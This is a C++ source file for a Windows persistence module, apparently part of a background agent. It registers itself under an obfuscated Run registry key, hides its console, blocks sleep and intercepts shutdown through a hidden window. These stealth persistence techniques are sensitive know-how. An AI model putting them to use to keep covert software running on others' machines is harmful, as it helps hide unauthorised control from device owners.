#include "infrastructure/system/WindowsPersistence.hpp"

#include <chrono>

#include <Windows.h>
#include "domain/common/StringTable.hpp"

namespace nuub::infrastructure::system {

static const wchar_t* WINDOW_CLASS = L"AgentWindowClass";
static constexpr int WM_USER_SHUTDOWN = WM_USER + 1;

WindowsPersistence::WindowsPersistence(std::string pc_id, std::string auto_start_name)
    : pc_id_(std::move(pc_id))
    , auto_start_name_(std::move(auto_start_name)) {}

void WindowsPersistence::configure_auto_start() {
    // Get encrypted registry path
    std::string reg_path = domain::StringTable::get("reg_run");
    std::wstring w_reg_path(reg_path.begin(), reg_path.end());

    HKEY hkey;
    LONG result = RegOpenKeyExW(
        HKEY_CURRENT_USER,
        w_reg_path.c_str(),
        0, KEY_SET_VALUE, &hkey);

    if (result == ERROR_SUCCESS) {
        wchar_t exe_path[MAX_PATH]{};
        GetModuleFileNameW(nullptr, exe_path, MAX_PATH);

        std::wstring value = L"\"" + std::wstring(exe_path) + L"\"";
        RegSetValueExW(hkey,
            std::wstring(auto_start_name_.begin(), auto_start_name_.end()).c_str(),
            0, REG_SZ,
            reinterpret_cast<const BYTE*>(value.c_str()),
            static_cast<DWORD>((value.size() + 1) * sizeof(wchar_t)));

        RegCloseKey(hkey);
    }
}

void WindowsPersistence::hide_console() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
}

void WindowsPersistence::start_anti_sleep() {
    anti_sleep_running_ = true;
    anti_sleep_thread_ = std::thread(&WindowsPersistence::anti_sleep_loop, this);
}

void WindowsPersistence::stop_anti_sleep() {
    anti_sleep_running_ = false;
    if (anti_sleep_thread_.joinable()) {
        anti_sleep_thread_.join();
    }
}

void WindowsPersistence::anti_sleep_loop() {
    while (anti_sleep_running_) {
        SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED);
        std::this_thread::sleep_for(std::chrono::seconds(60));
    }
    SetThreadExecutionState(ES_CONTINUOUS);
}

static LRESULT CALLBACK wnd_proc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_CREATE) {
        auto* cs = reinterpret_cast<CREATESTRUCT*>(lParam);
        SetWindowLongPtr(hwnd, GWLP_USERDATA, reinterpret_cast<LONG_PTR>(cs->lpCreateParams));
        return 0;
    }

    if (msg == WM_QUERYENDSESSION || msg == WM_CLOSE || msg == WM_DESTROY) {
        auto* self = reinterpret_cast<WindowsPersistence*>(GetWindowLongPtr(hwnd, GWLP_USERDATA));
        if (self) {
            self->invoke_shutdown();
        }
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wParam, lParam);
}

void WindowsPersistence::create_hidden_window(std::function<void()> on_shutdown) {
    on_shutdown_ = std::move(on_shutdown);

    WNDCLASSEXW wc{};
    wc.cbSize = sizeof(wc);
    wc.lpfnWndProc = wnd_proc;
    wc.lpszClassName = WINDOW_CLASS;
    wc.hInstance = GetModuleHandleW(nullptr);

    RegisterClassExW(&wc);

    CreateWindowExW(
        0, WINDOW_CLASS, L"Hidden",
        0, 0, 0, 0, 0,
        HWND_MESSAGE, nullptr, GetModuleHandleW(nullptr),
        static_cast<void*>(this));
}

void WindowsPersistence::pump_messages() {
    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
}

void WindowsPersistence::invoke_shutdown() {
    if (on_shutdown_) on_shutdown_();
}

} // namespace nuub::infrastructure::system
